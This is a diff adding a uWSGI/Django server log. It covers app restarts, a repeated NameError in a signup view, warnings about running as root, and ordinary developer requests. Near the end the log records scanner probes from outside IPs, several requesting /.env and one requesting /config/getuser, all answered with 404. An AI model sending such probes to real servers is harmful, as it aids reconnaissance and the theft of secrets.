@@ -1,0 +1,2123 @@
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 05:24:47 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 05:24:07
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: b7f7fd6346ea
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x5590d638d200
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x5590d638d200 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+Not Found: /
+[pid: 8|app: 0|req: 1/1] 175.203.81.8 () {44 vars in 856 bytes} [Mon Mar 22 05:24:54 2021] GET / => generated 2564 bytes in 339 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /favicon.ico
+[pid: 8|app: 0|req: 2/2] 175.203.81.8 () {42 vars in 789 bytes} [Mon Mar 22 05:24:54 2021] GET /favicon.ico => generated 2615 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 3/3] 175.203.81.8 () {44 vars in 868 bytes} [Mon Mar 22 05:24:59 2021] GET /admin/ => generated 0 bytes in 10 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 4/4] 175.203.81.8 () {44 vars in 905 bytes} [Mon Mar 22 05:24:59 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 28 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 5/5] 175.203.81.8 () {42 vars in 844 bytes} [Mon Mar 22 05:24:59 2021] GET /admin/ => generated 0 bytes in 1 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 6/6] 175.203.81.8 () {42 vars in 881 bytes} [Mon Mar 22 05:24:59 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 12 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 1)
+Not Found: /accounts/
+[pid: 8|app: 0|req: 7/7] 175.203.81.8 () {42 vars in 850 bytes} [Mon Mar 22 05:25:06 2021] GET /accounts/ => generated 4068 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Method Not Allowed: /accounts/signup/
+[pid: 8|app: 0|req: 8/8] 175.203.81.8 () {42 vars in 864 bytes} [Mon Mar 22 05:25:11 2021] GET /accounts/signup/ => generated 5602 bytes in 18 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 1)
+Internal Server Error: /accounts/signup/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/generic/base.py", line 70, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/decorators.py", line 50, in handler
+    return func(*args, **kwargs)
+  File "./Accounts/views.py", line 79, in signup
+    if pin_code != pin_code_confirmation:
+NameError: name 'pin_code_confirmation' is not defined
+[pid: 8|app: 0|req: 9/9] 175.203.81.8 () {44 vars in 760 bytes} [Mon Mar 22 05:25:39 2021] POST /accounts/signup/ => generated 87248 bytes in 36 msecs (HTTP/1.1 500) 6 headers in 194 bytes (1 switches on core 0)
+Internal Server Error: /accounts/signup/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/generic/base.py", line 70, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/decorators.py", line 50, in handler
+    return func(*args, **kwargs)
+  File "./Accounts/views.py", line 79, in signup
+    if pin_code != pin_code_confirmation:
+NameError: name 'pin_code_confirmation' is not defined
+[pid: 8|app: 0|req: 10/10] 175.203.81.8 () {44 vars in 760 bytes} [Mon Mar 22 05:25:57 2021] POST /accounts/signup/ => generated 87409 bytes in 34 msecs (HTTP/1.1 500) 6 headers in 194 bytes (1 switches on core 1)
+Internal Server Error: /accounts/signup/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/generic/base.py", line 70, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/decorators.py", line 50, in handler
+    return func(*args, **kwargs)
+  File "./Accounts/views.py", line 79, in signup
+    if pin_code != pin_code_confirmation:
+NameError: name 'pin_code_confirmation' is not defined
+[pid: 8|app: 0|req: 11/11] 175.203.81.8 () {44 vars in 760 bytes} [Mon Mar 22 05:26:08 2021] POST /accounts/signup/ => generated 87409 bytes in 32 msecs (HTTP/1.1 500) 6 headers in 194 bytes (1 switches on core 0)
+Internal Server Error: /accounts/signup/
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib/python3.8/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
+    return view_func(*args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/django/views/generic/base.py", line 70, in view
+    return self.dispatch(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 509, in dispatch
+    response = self.handle_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 469, in handle_exception
+    self.raise_uncaught_exception(exc)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
+    raise exc
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/views.py", line 506, in dispatch
+    response = handler(request, *args, **kwargs)
+  File "/usr/local/lib/python3.8/site-packages/rest_framework/decorators.py", line 50, in handler
+    return func(*args, **kwargs)
+  File "./Accounts/views.py", line 79, in signup
+    if pin_code != pin_code_confirmation:
+NameError: name 'pin_code_confirmation' is not defined
+[pid: 8|app: 0|req: 12/12] 175.203.81.8 () {44 vars in 760 bytes} [Mon Mar 22 05:26:20 2021] POST /accounts/signup/ => generated 87411 bytes in 33 msecs (HTTP/1.1 500) 6 headers in 194 bytes (1 switches on core 1)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/django.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 05:30:42 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 05:24:07
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: b7f7fd6346ea
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x56235f5981d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x56235f5981d0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 11, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 05:32:36 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 05:31:57
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 1dfe031f6eb1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55ac29ffc200
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55ac29ffc200 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 9, cores: 2)
+Not Found: /api/
+[pid: 9|app: 0|req: 1/1] 175.203.81.8 () {42 vars in 840 bytes} [Mon Mar 22 05:32:46 2021] GET /api/ => generated 2594 bytes in 339 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /api/admin/
+[pid: 9|app: 0|req: 2/2] 175.203.81.8 () {42 vars in 852 bytes} [Mon Mar 22 05:32:49 2021] GET /api/admin/ => generated 2612 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /api/accounts/
+[pid: 9|app: 0|req: 3/3] 175.203.81.8 () {42 vars in 858 bytes} [Mon Mar 22 05:32:52 2021] GET /api/accounts/ => generated 2621 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /api/accounts/signup/
+[pid: 9|app: 0|req: 4/4] 175.203.81.8 () {42 vars in 872 bytes} [Mon Mar 22 05:32:56 2021] GET /api/accounts/signup/ => generated 2642 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /api/accounts/
+[pid: 9|app: 0|req: 5/5] 175.203.81.8 () {42 vars in 858 bytes} [Mon Mar 22 05:33:00 2021] GET /api/accounts/ => generated 2621 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /api/
+[pid: 9|app: 0|req: 6/6] 175.203.81.8 () {42 vars in 840 bytes} [Mon Mar 22 05:33:04 2021] GET /api/ => generated 2594 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /api/api/
+[pid: 9|app: 0|req: 7/7] 175.203.81.8 () {42 vars in 848 bytes} [Mon Mar 22 05:33:13 2021] GET /api/api/ => generated 2606 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /api/
+[pid: 9|app: 0|req: 8/8] 175.203.81.8 () {42 vars in 840 bytes} [Mon Mar 22 05:33:16 2021] GET /api/ => generated 2594 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /api/admin/
+[pid: 9|app: 0|req: 9/9] 175.203.81.8 () {42 vars in 852 bytes} [Mon Mar 22 05:33:20 2021] GET /api/admin/ => generated 2612 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /api/admin/
+[pid: 9|app: 0|req: 10/10] 175.203.81.8 () {42 vars in 853 bytes} [Mon Mar 22 05:33:33 2021] GET /api//admin/ => generated 2612 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /api/admin/
+[pid: 9|app: 0|req: 11/11] 175.203.81.8 () {42 vars in 852 bytes} [Mon Mar 22 05:33:38 2021] GET /api/admin/ => generated 2612 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/django.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 05:33:49 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 05:31:57
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 1dfe031f6eb1
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x558e7e9e21d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x558e7e9e21d0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 12, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 05:36:18 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 05:35:39
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 3841ea5d4a0f
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x557498d4f200
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x557498d4f200 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 7, cores: 2)
+Not Found: /api
+[pid: 7|app: 0|req: 1/1] 175.203.81.8 () {42 vars in 838 bytes} [Mon Mar 22 05:36:30 2021] GET /api => generated 2591 bytes in 337 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /api/admin/
+[pid: 7|app: 0|req: 2/2] 175.203.81.8 () {44 vars in 876 bytes} [Mon Mar 22 05:36:34 2021] GET /api/admin/ => generated 2612 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /api/accounts/
+[pid: 7|app: 0|req: 3/3] 175.203.81.8 () {42 vars in 858 bytes} [Mon Mar 22 05:36:39 2021] GET /api/accounts/ => generated 2621 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+...brutally killing workers...
+worker 1 buried after 1 seconds
+binary reloading uWSGI...
+chdir() to /srv/docker-server
+closing all non-uwsgi socket fds > 2 (max_fd = 1048576)...
+found fd 3 mapped to socket 0 (/srv/docker-server/django.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from uwsgi.ini
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 05:37:39 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 05:35:39
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: 3841ea5d4a0f
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x55dde2f411d0
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55dde2f411d0 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 10, cores: 2)
+*** Starting uWSGI 2.0.19.1 (64bit) on [Mon Mar 22 05:38:02 2021] ***
+compiled with version: 8.3.0 on 22 March 2021 05:35:39
+os: Linux-5.4.0-1018-aws #18-Ubuntu SMP Wed Jun 24 01:15:00 UTC 2020
+nodename: b39e63c71bbf
+machine: x86_64
+clock source: unix
+pcre jit disabled
+detected number of CPU cores: 4
+current working directory: /srv/docker-server
+detected binary path: /usr/local/bin/uwsgi
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /srv/docker-server
+your memory page size is 4096 bytes
+detected max file descriptor number: 1048576
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to UNIX address /srv/docker-server/django.sock fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.8.5 (default, Sep 10 2020, 16:47:10)  [GCC 8.3.0]
+Python main interpreter initialized at 0x556719df4200
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 166752 bytes (162 KB) for 2 cores
+*** Operational MODE: threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x556719df4200 pid: 1 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1)
+spawned uWSGI worker 1 (pid: 8, cores: 2)
+Not Found: /
+[pid: 8|app: 0|req: 1/1] 175.203.81.8 () {42 vars in 832 bytes} [Mon Mar 22 05:38:29 2021] GET / => generated 2564 bytes in 356 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 2/2] 175.203.81.8 () {42 vars in 844 bytes} [Mon Mar 22 05:38:34 2021] GET /admin/ => generated 0 bytes in 11 msecs (HTTP/1.1 302) 9 headers in 339 bytes (1 switches on core 1)
+[pid: 8|app: 0|req: 3/3] 175.203.81.8 () {42 vars in 881 bytes} [Mon Mar 22 05:38:34 2021] GET /admin/login/?next=/admin/ => generated 2194 bytes in 29 msecs (HTTP/1.1 200) 9 headers in 469 bytes (1 switches on core 0)
+Not Found: /accounts/
+[pid: 8|app: 0|req: 4/4] 175.203.81.8 () {44 vars in 874 bytes} [Mon Mar 22 05:38:40 2021] GET /accounts/ => generated 4068 bytes in 5 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Method Not Allowed: /accounts/signup/
+[pid: 8|app: 0|req: 5/5] 175.203.81.8 () {44 vars in 888 bytes} [Mon Mar 22 05:38:41 2021] GET /accounts/signup/ => generated 5602 bytes in 18 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 0)
+[pid: 8|app: 0|req: 6/6] 175.203.81.8 () {44 vars in 760 bytes} [Mon Mar 22 05:38:44 2021] POST /accounts/signup/ => generated 241 bytes in 413 msecs (HTTP/1.1 201) 7 headers in 215 bytes (1 switches on core 1)
+Method Not Allowed: /accounts/signup/
+[pid: 8|app: 0|req: 7/7] 175.203.81.8 () {44 vars in 895 bytes} [Mon Mar 22 05:40:45 2021] GET /accounts/signup/ => generated 5602 bytes in 16 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 0)
+Method Not Allowed: /accounts/login/
+[pid: 8|app: 0|req: 8/8] 175.203.81.8 () {42 vars in 862 bytes} [Mon Mar 22 05:40:49 2021] GET /accounts/login/ => generated 7703 bytes in 19 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 8|app: 0|req: 9/9] 129.146.252.126 () {36 vars in 490 bytes} [Mon Mar 22 05:41:04 2021] GET /.env => generated 2588 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Method Not Allowed: /accounts/login/
+[pid: 8|app: 0|req: 10/10] 175.203.81.8 () {44 vars in 893 bytes} [Mon Mar 22 05:51:14 2021] GET /accounts/login/ => generated 7703 bytes in 21 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 1)
+Method Not Allowed: /accounts/login/
+[pid: 8|app: 0|req: 11/11] 175.203.81.8 () {44 vars in 893 bytes} [Mon Mar 22 05:51:15 2021] GET /accounts/login/ => generated 7703 bytes in 19 msecs (HTTP/1.1 405) 8 headers in 403 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 12/12] 45.144.225.87 () {40 vars in 555 bytes} [Mon Mar 22 07:24:05 2021] GET / => generated 2561 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /config/getuser
+[pid: 8|app: 0|req: 13/13] 205.185.122.102 () {40 vars in 661 bytes} [Mon Mar 22 08:15:12 2021] GET /config/getuser?index=0 => generated 2629 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 14/14] 45.144.225.99 () {40 vars in 555 bytes} [Mon Mar 22 08:37:49 2021] GET / => generated 2561 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /.env
+[pid: 8|app: 0|req: 15/15] 104.223.21.22 () {36 vars in 511 bytes} [Mon Mar 22 09:11:57 2021] GET /.env => generated 2588 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /
+[pid: 8|app: 0|req: 16/16] 104.223.21.22 () {40 vars in 618 bytes} [Mon Mar 22 09:11:58 2021] POST / => generated 2559 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 1)
+Not Found: /
+[pid: 8|app: 0|req: 17/17] 74.82.47.3 () {28 vars in 292 bytes} [Mon Mar 22 09:41:06 2021] GET / => generated 2558 bytes in 4 msecs (HTTP/1.1 404) 6 headers in 173 bytes (1 switches on core 0)
+Not Found: /.env
